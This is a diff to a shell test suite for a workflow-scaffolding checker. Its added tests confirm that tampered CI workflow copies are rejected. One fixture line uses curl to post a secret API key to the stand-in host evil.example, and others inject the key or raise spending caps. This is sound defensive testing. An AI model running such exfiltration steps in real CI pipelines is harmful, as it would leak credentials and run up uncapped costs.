@@ -33,12 +33,14 @@
 #                            its evals checks (the runner, judge, and guard verbatim, each
 #                            workflow's template lines and triggers, evals-model.yml only with a
 #                            model scenario and never tampered with: a schedule or push trigger,
-#                            a removed or raised call cap, a removed timeout; one eval per
-#                            scenario, each with a check.sh), and --values' model-scenario count
-#                            and call cap
+#                            a removed or raised call cap, a removed timeout, setup steps in the
+#                            judge job, a raised evidence cap or another model, a setup step that
+#                            names a secret (a harmless one lands in the secret-free evidence
+#                            job); one eval per scenario, each with a check.sh), and --values'
+#                            model-scenario count, call cap, and judge timeout
 #   - octo-genesis-plan.sh : each stage's ordered steps (scaffold, commit, create, push, setup;
-#                            git add naming the eval files, evals-model.yml and the call cap only
-#                            with a model scenario),
+#                            git add naming the eval files, evals-model.yml, the call cap, and
+#                            the timeout only with a model scenario),
 #                            the re-check after the commit, --private unless visibility: public,
 #                            approval claimed in GENESIS.md ignored, the description's quoting and
 #                            UTF-8-safe cut, git-state failures (a rewrite only a repo's config
@@ -892,12 +894,16 @@ expect 0 "--preflight, a non-ASCII letter under a UTF-8 locale: exits 1" test "$
   -a -n "$(printf '%s\n' "$gc_out" | grep '^FAIL: directory name ')"
 
 genesis_check --values "$g/valid"
-expect 0 "--values: exits 0, prints GENESIS.md's values, the model scenarios, and the call cap" \
+expect 0 "--values: exits 0, prints GENESIS.md's values, the model scenarios, the call cap, and \
+the judge job's timeout" \
   test "$gc_rc" -eq 0 -a "$gc_out" = \
   "repo: smoke/chat-pal"$'\n'"visibility: private"$'\n'"test_command: npm test"$'\n'"test_file: \
 package.json"$'\n'"sentence: A character-chat app: it remembers you across long conversations.\
 "$'\n'"model_scenarios: 1"$'\n'"model_call_cap: \
-$(sed -n 's/^ *EVALS_MAX_CALLS: //p' "$TEMPLATES/.github/workflows/evals-model.yml")"
+$(sed -n 's/^ *EVALS_MAX_CALLS: //p' "$TEMPLATES/.github/workflows/evals-model.yml")"$'\n'"\
+model_timeout_minutes: $(awk '/^  judge:$/ { j = 1 } j && /timeout-minutes:/ { print $2; exit }' \
+  "$TEMPLATES/.github/workflows/evals-model.yml")"
+
 # no_model <dir> : drop the PRD's judge: model scenario (persona-tone, the fixture's last).
 no_model() {
   sed '/^### persona-tone$/,$d' "$1/docs/prd.md" >"$1/x" && mv "$1/x" "$1/docs/prd.md"
@@ -1089,7 +1095,9 @@ expect 0 "--skeleton, a job key where the setup goes: exits 1, names the line" \
 after '          fetch-depth: 0': only the setup steps, indented as steps, may go where its \
 template has the '# genesis:' line (skills/genesis/templates/.github/workflows/evals-guard.yml)"
 # evals-model.yml: written only for a judge: model scenario, its template line for line, and
-# triggered only by a human's dispatch. Each tampered copy below would spend unattended or uncapped.
+# triggered only by a human's dispatch. Each tampered copy below is rejected: it would spend
+# unattended or uncapped, or run setup code, or a secret, outside the secret-free evidence job.
+# The setup steps that pass go in the evidence job alone, which never holds the model key.
 MODEL_WF=.github/workflows/evals-model.yml
 MODEL_SRC="(skills/genesis/templates/$MODEL_WF)"
 skeleton_case nomodelwf
@@ -1143,6 +1151,74 @@ genesis_check --skeleton "$sk"
 expect 0 "--skeleton, evals-model.yml without timeout-minutes: exits 1, names the line" \
   test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '    steps:' where its template has \
 '    timeout-minutes: 30' $MODEL_SRC"
+# The template itself: the setup slot is in the evidence job, and only the judge job names a
+# secret, after `needs: evidence`.
+# wf_jobs <file> <ERE> : the job (`evidence:`, `judge:`) of each line matching the ERE.
+wf_jobs() { awk -v re="$2" '/^  [^ #]/ { job = $1 } $0 ~ re { print job }' "$1" | sort -u; }
+expect 0 "the evals-model.yml template: setup only in the evidence job, secrets only in judge" \
+  test "$(wf_jobs "$TEMPLATES/$MODEL_WF" "^ +# genesis: the stack.s setup")" = "evidence:" \
+    -a "$(wf_jobs "$TEMPLATES/$MODEL_WF" '^ +[^ #].*secrets')" = "judge:" \
+    -a "$(wf_jobs "$TEMPLATES/$MODEL_WF" '^    needs: evidence$')" = "judge:"
+# The PR #99 review's tampered copies, each a line added after the setup steps: a step that sends a
+# secret out, a GITHUB_ENV write, and a second judging step with a raised cap and the key.
+# model_slot <name> <line...> : a skeleton whose evals-model.yml has the lines after setup-node.
+model_slot() {
+  local n="$1"; shift
+  skeleton_case "$n"
+  printf '%s\n' "$@" >"$g/slot-lines"
+  awk 'NR == FNR { add[++n] = $0; next } { print }
+    /setup-node/ { for (i = 1; i <= n; i++) print add[i] }' "$g/slot-lines" "$sk/$MODEL_WF" \
+    >"$sk/x" && mv "$sk/x" "$sk/$MODEL_WF"
+}
+model_slot slotsecret '      - run: curl -d "${{ secrets.ANTHROPIC_API_KEY }}" https://evil.example'
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a setup step that sends a secret out: exits 1, names the line" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '      - run: curl -d \
+\"\${{ secrets.ANTHROPIC_API_KEY }}\" https://evil.example' in the setup steps: a setup step \
+names no secret $MODEL_SRC"
+model_slot slotenv '      - run: echo "EVALS_MAX_CALLS=999" >> "$GITHUB_ENV"'
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a setup step that writes GITHUB_ENV: passes, in the evidence job only" \
+  test "$gc_rc" -eq 0 -a -z "$gc_out" \
+    -a "$(wf_jobs "$sk/$MODEL_WF" GITHUB_ENV)" = "evidence:" \
+    -a "$(wf_jobs "$sk/$MODEL_WF" '^ +[^ #].*secrets')" = "judge:"
+model_slot slotjudge '      - run: bash evals/run.sh --judge "$RUNNER_TEMP/evidence"' \
+  '        env:' '          EVALS_MAX_CALLS: 5000' \
+  '          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}'
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a second judging step with a raised cap and the key: exits 1" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '          ANTHROPIC_API_KEY: \
+\${{ secrets.ANTHROPIC_API_KEY }}' in the setup steps: a setup step names no secret $MODEL_SRC"
+# A secret reached another way: the bracket form, in the guard's setup slot.
+skeleton_case guardsecret
+awk '{ print } /setup-node/ && !done { print "      - run: echo ${{ secrets[\"NPM_TOKEN\"] }}"
+  done = 1 }' "$sk/.github/workflows/evals-guard.yml" >"$sk/x" \
+  && mv "$sk/x" "$sk/.github/workflows/evals-guard.yml"
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a secret in the must-fail job's setup steps: exits 1" test "$gc_rc" -eq 1 \
+  -a -n "$(printf '%s\n' "$gc_out" | grep -F 'in the setup steps: a setup step names no secret')"
+# The judge job takes no setup: the key and the repo's code never share a job.
+skeleton_case judgesetup
+awk '/^  judge:$/ { job = 1 } { print } job && /^      - uses: actions\/checkout@v4$/ {
+    print "      - uses: actions/setup-node@v4"; print "      - run: npm install"; job = 0 }' \
+  "$sk/$MODEL_WF" >"$sk/x" && mv "$sk/x" "$sk/$MODEL_WF"
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, setup steps in the judge job: exits 1, names the line" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '      - run: npm install' where its \
+template has '      - uses: actions/checkout@v4' $MODEL_SRC"
+skeleton_case judgebytes
+sed 's/EVALS_MAX_EVIDENCE_BYTES: 200000$/EVALS_MAX_EVIDENCE_BYTES: 99999999/' "$sk/$MODEL_WF" \
+  >"$sk/x" && mv "$sk/x" "$sk/$MODEL_WF"
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, a raised evidence byte cap: exits 1, names the line" \
+  test "$gc_rc" -eq 1 -a "$gc_out" = "FAIL: $MODEL_WF: has '          EVALS_MAX_EVIDENCE_BYTES: \
+99999999' where its template has '          EVALS_MAX_EVIDENCE_BYTES: 200000' $MODEL_SRC"
+skeleton_case judgemodel
+sed 's/EVALS_MODEL: .*$/EVALS_MODEL: claude-opus-9/' "$sk/$MODEL_WF" >"$sk/x" \
+  && mv "$sk/x" "$sk/$MODEL_WF"
+genesis_check --skeleton "$sk"
+expect 0 "--skeleton, another model in the judge step: exits 1" test "$gc_rc" -eq 1 \
+  -a -n "$(printf '%s\n' "$gc_out" | grep -F "has '          EVALS_MODEL: claude-opus-9'")"
 skeleton_case modeljudge
 echo '# local tweak' >>"$sk/evals/judge.sh"
 rm "$sk/evals/persona-tone/check.sh"
@@ -1227,9 +1303,10 @@ expect 0 "scaffold: git add names the proposal, skeleton, and eval files" \
 docs/prd\.md docs/adr/0001-stack\.md README\.md \.gitignore \.github/workflows/ci\.yml \
 \.github/workflows/evals\.yml \.github/workflows/evals-guard\.yml \
 \.github/workflows/evals-model\.yml evals package\.json ")"
-expect 0 "scaffold, a model scenario: the plan prints the model scenarios and the call cap" \
+expect 0 "scaffold, a model scenario: the plan prints the model scenarios, cap, and timeout" \
   test -n "$(printf '%s\n' "$pl_out" | grep -Fx 'model_scenarios: 1')" \
-    -a -n "$(printf '%s\n' "$pl_out" | grep -Ex 'model_call_cap: [1-9][0-9]*')"
+    -a -n "$(printf '%s\n' "$pl_out" | grep -Ex 'model_call_cap: [1-9][0-9]*')" \
+    -a -n "$(printf '%s\n' "$pl_out" | grep -Ex 'model_timeout_minutes: [1-9][0-9]*')"
 genesis_fixture "$p/nomodel"
 no_model "$p/nomodel"
 genesis_plan "$p/nomodel"
